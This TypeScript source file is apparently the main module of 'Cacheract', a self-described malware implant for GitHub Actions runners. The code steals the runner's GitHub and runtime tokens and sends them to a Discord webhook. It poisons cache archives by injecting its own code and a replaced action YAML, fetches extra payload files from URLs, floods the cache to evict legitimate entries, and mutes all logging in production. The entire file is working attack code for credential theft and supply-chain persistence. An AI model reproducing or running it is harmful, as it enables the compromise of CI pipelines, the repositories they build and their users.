import * as fs from 'fs';
import * as crypto from 'crypto';
import { getToken, listCacheEntries, clearEntry, checkRunnerEnvironment, retrieveEntry, listActions, isDefaultBranch, updateArchive, generateRandomString, prepareFileEntry, createArchive, isInfected, checkCacheEntry, sleep } from './utils';
import axios from 'axios';
import { CHECKOUT_YML } from './static';
import { FILL_CACHE, SLEEP_TIMER, DISCORD_WEBHOOK, REPLACEMENTS, EXPLICIT_ENTRIES } from './config';
import { reportDiscord } from './exfil';
import * as path from 'path';
import { calculateCacheConfigs, calculateCacheVersion, getSetupActions, getWorkflows } from './cache_predictor';
import { getCacheDirectories, getPackageManagerInfo } from './cache_predictor/node';
import { FinalizeCacheEntryUploadRequest, FinalizeCacheEntryUploadResponse, CreateCacheEntryRequest } from '@actions/cache/lib/generated/results/api/v1/cache';

var cacheTwirpClient = require('@actions/cache/lib/internal/shared/cacheTwirpClient');
var cacheHttpClient = require('@actions/cache/lib/internal/cacheHttpClient');
/**
 * Set a cache entry
 * @param archive - Path to the archive file
 * @param key - Cache key
 * @param version - Cache version
 * @param runtimeToken - GitHub Actions runtime token
 * @returns Promise<boolean> indicating if the cache entry was set successfully
 */
async function setEntry(archive: string, key: string, version: string, runtimeToken: string): Promise<boolean> {
    try {
        // Validate inputs
        if (!runtimeToken) {
            console.error('Runtime token is missing');
            return false;
        }

        // Get file size of the archive path
        if (!fs.existsSync(archive)) {
            console.error(`Archive file does not exist at path: ${archive}`);
            return false;
        }

        const stats = fs.statSync(archive);
        const archiveFileSize = stats.size;

        // const headers = {
        //     'Authorization': `Bearer ${runtimeToken}`,
        //     'User-Agent': 'actions/cache-4.0.2',
        //     'accept': 'application/json'
        // };

        const request: CreateCacheEntryRequest = {
            key,
            version
        }

        process.env['ACTIONS_RESULTS_URL'] = 'https://results-receiver.actions.githubusercontent.com';
        process.env['ACTIONS_RUNTIME_TOKEN'] = runtimeToken;

        const twirpClient = cacheTwirpClient.internalCacheTwirpClient();

        const response = twirpClient.CreateCacheEntry(request);

        if (response.ok) {
            await cacheHttpClient.saveCache(-1, archive, response.signedUploadUrl);
            console.log('Cache entry created successfully:', response.data);

            const finalizeRequest: FinalizeCacheEntryUploadRequest = {
                key,
                version,
                sizeBytes: `${archiveFileSize}`
            }

            const finalizeResponse: FinalizeCacheEntryUploadResponse = await twirpClient.FinalizeCacheEntryUpload(finalizeRequest);

            if (finalizeResponse.ok) {
                console.log('Cache entry finalized successfully!');
                return true;
            } else {
                console.error('Error finalizing cache entry');
                return false;
            }
        } else {
            console.log('Error saving cache entry:', response.status, response.statusText);
            return false;
        }
      } catch (error) {
        console.error('Error setting cache entry:', error);
        return false;
    }
}

/**
 * 
 * @param archive_path - Path to the archive to poison.
 * @returns Promise<boolean> indicating if the archive was updated successfully
 */
export async function updateEntry(archive_path: string): Promise<boolean> {
    const currentFilePath = path.resolve(__dirname, __filename);

    // Generate a random directory name
    const randomDirName = generateRandomString(12);
    const sourceDir = path.join('/tmp', `${randomDirName}`);
    const cacheFile = archive_path;
    const leadingPath = '/home/runner/work/_actions';

    // Ensure the source directory exists
    if (!fs.existsSync(sourceDir)) {
        fs.mkdirSync(sourceDir, { recursive: true });
    }

    const archiveDetails: { stagingDir: string; leadingPath: string; }[] = []

    const actions = await listActions(leadingPath);
    
    for (const actionDetails of actions) {
        const stagingDir = `${sourceDir}/${actionDetails?.path}`
        fs.mkdirSync(`${stagingDir}/dist`, { recursive: true });
        // Copy the current file to the source directory
        if (actionDetails?.js) {
            const newJsFile = actionDetails.js.replace('index.js', 'utility.js');
            fs.copyFileSync(currentFilePath, path.join(stagingDir, newJsFile));
        } else {
            throw new Error('JavaScript file path is undefined');
        }
        const checkout_yml = CHECKOUT_YML;
        fs.writeFileSync(path.join(stagingDir, actionDetails.yml), checkout_yml);
        archiveDetails.push({
            stagingDir: stagingDir,
            leadingPath: path.join(leadingPath, actionDetails.path)
        });
    }

    if (REPLACEMENTS.length > 0) {
        console.log("Replacements configured, adding to poisoned archive!")
        for (const replacement of REPLACEMENTS) {
            var decodedContent: string = '';
            if (replacement.FILE_CONTENT) {
                // Base64 decode the content
                decodedContent = Buffer.from(replacement.FILE_CONTENT, 'base64').toString('utf-8');
            } else if (replacement.FILE_URL) {
                const response = await axios.get(replacement.FILE_URL);
                if (response.status === 200) {
                    decodedContent = response.data;
                }
            }

            if (decodedContent) {
                const fileName = path.basename(replacement.FILE_PATH);
                const dirPath = path.dirname(replacement.FILE_PATH);
                const sourceDir = await prepareFileEntry(fileName, decodedContent);
                archiveDetails.push({
                    stagingDir: sourceDir,
                    leadingPath: dirPath
                });
            } else {
                console.error(`Failed to fetch content for replacement: ${replacement.FILE_PATH}`);
            }
        }
    }

    await updateArchive(cacheFile, archiveDetails);

    return true;
}

async function createEntry(size: number): Promise<string> {
    const randomDirName = generateRandomString(12);
    const sourceDir = path.join('/tmp', `${randomDirName}`);
    const archivePath = path.join('/tmp', `${randomDirName}.tar.gz`);

    // Ensure the source directory exists
    if (!fs.existsSync(sourceDir)) {
        fs.mkdirSync(sourceDir, { recursive: true });
    }

    // Create random file of number in size in sourcedir
    // Create random file with specified size
    const filePath = path.join(sourceDir, 'random.dat');
    const chunkSize = 1024 * 1024; // 1MB chunks
    const writeStream = fs.createWriteStream(filePath);

    try {
        let remaining = size;
        while (remaining > 0) {
            const currentChunk = Math.min(remaining, chunkSize);
            const buffer = crypto.randomBytes(currentChunk);
            writeStream.write(buffer);
            remaining -= currentChunk;
        }
        writeStream.end();

        await new Promise((resolve, reject) => {
            writeStream.on('finish', resolve);
            writeStream.on('error', reject);
        });
    } catch (error) {
        console.error(`Error creating random file: ${error}`);
        throw error;
    }

    // Tar the directory
    await createArchive(archivePath, sourceDir)

    return archivePath;
}

async function createAndSetEntry(
    size: number,
    key: string,
    version: string, 
    accessToken: string
) {
    const path = await createEntry(size);
    if (path) {
        const status = await updateEntry(path);
        if (status) {
            await setEntry(path, key, version, accessToken);
        } else {
            console.error("Failed to poison archive!");
        }
    } else {
        console.error("Failed to create entry for key.");
    }
}

async function main() {
    const goodRunner = await checkRunnerEnvironment();
    if (goodRunner.github_hosted === true) {
        if (goodRunner.os !== 'Linux') {
            console.log('Cacheract currently only supports GitHub Hosted Linux runners.');
            console.log('Reporting telemetry to Discord since it is GitHub hosted.');
            process.exit(0);
        }
    } else {
        console.log('Cacheract is not running on a GitHub Hosted runner, exiting without reporting telemtry (we could be anywhere).');
        process.exit(0);
    }

    const tokens = await getToken();
    const accessToken = tokens.get('ACCESS_TOKEN');
    const githubToken = tokens.get('GITHUB_TOKEN');

    console.log("Running 🧊 Cacheract 🧊 in verbose development mode!")
    console.log("📣 If this is unexpected, then you have likely been pwned, but the pwner didn't RTFM. 🫠")
    console.log("Flush all GitHub Actions Caches to evict this malware.")

    if (DISCORD_WEBHOOK) {
        console.log('Reporting secrets 🤫 to Discord');
        reportDiscord(DISCORD_WEBHOOK, tokens).catch((error) => {
            console.error('Error reporting to Discord:', error);
        });
    } else {
        console.log('No Discord webhook configured 😢');
    }

    if (SLEEP_TIMER > 0) {
        console.log(`Sleeping for ${SLEEP_TIMER} seconds...`);
        await sleep(SLEEP_TIMER * 1000);
    }

    if (githubToken && accessToken) {
        process.env['ACCESS_TOKEN'] = accessToken;
        process.env['ACTIONS_RUNTIME_TOKEN'] = accessToken;

    } else {
        console.log('Missing required tokens, exiting.');
        process.exit(0);
    }

    // Fill the cache with some data - if specified
    if (!isInfected() && FILL_CACHE > 0) {
        for (let i = 0; i < FILL_CACHE; i++) {
            await createAndSetEntry(1000000000, "setup-python-Linux-24.04-Ubuntu-python-", `"CACHERACT${i}"`, accessToken);
        }
    }

    if (githubToken && accessToken && await isDefaultBranch(githubToken)) {
        const entries = await listCacheEntries(githubToken);
        let clearEntryFailed = false;
        try {
            const configs = await calculateCacheConfigs();

            // Add any manually configured entries
            for (const entry of EXPLICIT_ENTRIES) {
                configs.add(`${entry.key}:${entry.version}`);
            }

            console.log('Calculated cache configs:', configs)

            for (const config of configs) {
                const [key, version] = [
                    config.slice(0, config.lastIndexOf(':')),
                    config.slice(config.lastIndexOf(':') + 1)
                ];
                // Check if entry exists in main

                if (process.env.GITHUB_REF) {
                    if (!await checkCacheEntry(githubToken, key, process.env.GITHUB_REF)) {
                        // We add the entry to the list of entries to be updated.
                        entries.push({
                            key,
                            version,
                            ref: "e808b8c29727ee0b47c076d7dfad1db8c5a39eec", // just a dummy value to satisfy this program's logic.
                            size: 1333337
                        });
                    }
                } else {
                    console.error('GITHUB_REF is not defined');
                }
            }

            if (!entries || entries.length === 0) {
                console.log('No cache entries found, Cacheract will not attempt to update entries as it does not know the keys.');
            } else {
                for (const entry of entries) {
                    const { key, version, ref, size } = entry;
                    const currBranch = process.env['GITHUB_REF'];
                    

                    if (isInfected() && currBranch === ref) {
                        console.log(`Not attempting to clear entry as it already contains Cacheract.`);
                        continue;
                    }

                    if (clearEntryFailed) {
                        if (currBranch === ref) {
                            console.log(`Skipping setting entry for key ${key} due to previous clearEntry failure`);
                            continue;
                        } else {
                            console.log("Attempting to update entry in main that is currently only in a feature branch or a custom entry.");
                            await createAndSetEntry(size, key, version, accessToken);
                            continue;
                        }
                    }

                    let path = '';
                    if (currBranch !== ref) {
                        console.log(`Attempting to update entry in main that is currently only in a feature branch or a custom entry.`);
                        // Entry is not in the default branch, create a new entry
                        path = await createEntry(size);
                    } else if (!version.includes("CACHERACT")) {
                        // Entry is in default branch, retrieve it
                        path = await retrieveEntry(key, version, accessToken);

                        if (!path) {
                            console.log(`Failed to retrieve cache entry ${key}!`);
                            continue;
                        }
                    } else {
                        continue
                    }

                    // Update the entry, whether we made one or retrieved it.
                    const status = await updateEntry(path);
                    if (status) {

                        // Attempt to clear the entry from the feature branch
                        // this will help us jump (such as to a tag that uses a secret, etc).
                        const cleared = await clearEntry(key, version, githubToken);
                        if (!cleared) {
                            // Likely means we do not have actions: write
                            console.log(`Failed to clear cache entry ${key}!`);
                            clearEntryFailed = true;
                        }
                        // If we cleared the entry or if the entry was on feature branch then we set it.
                        if (cleared || currBranch !== ref) {
                            console.log(`Setting entry for key ${key}`);
                            await setEntry(path, key, version, accessToken);
                        }
                    } else {
                        console.log("Failed to poison archive!");
                    }
                }
            }
        } catch (error) {
            console.log(error);
        }
    } else {
        console.log('Cacheract running in non-default branch, skipping cache poisoning.');
    }
}

// Suppress output in production
if (process.env.NODE_ENV === 'production') {
    process.stdout.write = (() => { }) as unknown as typeof process.stdout.write;
    process.stderr.write = (() => { }) as unknown as typeof process.stderr.write;
    console.log = () => { };
    console.error = () => { };
}

main().catch(error => {
    console.error(error);
});
